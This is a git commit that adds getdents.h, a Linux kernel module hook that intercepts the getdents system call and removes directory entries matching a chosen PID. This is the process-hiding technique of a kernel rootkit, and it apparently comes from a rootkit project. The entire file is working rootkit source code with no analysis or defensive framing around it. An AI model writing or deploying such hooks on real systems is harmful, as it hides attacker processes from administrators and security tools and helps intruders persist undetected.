ad3cffbefdccd2d61cc5bebd3a533190c00438c1
fs3cs0ciety <fs3cs0ciety@gmail.com>
2024-11-07 16:44:24 -0500

    Create getdents.h

---
+++ src/1.4_PID_toggle_inv/hooks/getdents.h
@@ -0,0 +1,65 @@
+#ifndef _GETDENTS_H_
+#define _GETDENTS_H_
+
+
+static asmlinkage long (*orig_getdents)(const struct pt_regs *);
+
+notrace asmlinkage int hook_getdents(const struct pt_regs *regs)
+{
+    struct linux_dirent {
+        unsigned long d_ino;
+        unsigned long d_off;
+        unsigned short d_reclen;
+        char d_name[];
+    };
+
+    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
+
+    long error;
+
+    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+    unsigned long offset = 0;
+
+    int ret = orig_getdents(regs);
+    dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+    if ( (ret <= 0) || (dirent_ker == NULL) )
+        return ret;
+
+    error = copy_from_user(dirent_ker, dirent, ret);
+    if (error)
+        goto done;
+
+    while (offset < ret)
+    {
+        current_dir = (void *)dirent_ker + offset;
+
+        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
+        {
+            if ( current_dir == dirent_ker )
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+           
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else
+        {
+            previous_dir = current_dir;
+        }
+
+        offset += current_dir->d_reclen;
+    }
+
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error)
+        goto done;
+
+done:
+    kfree(dirent_ker);
+    return ret;
+}
+
+#endif
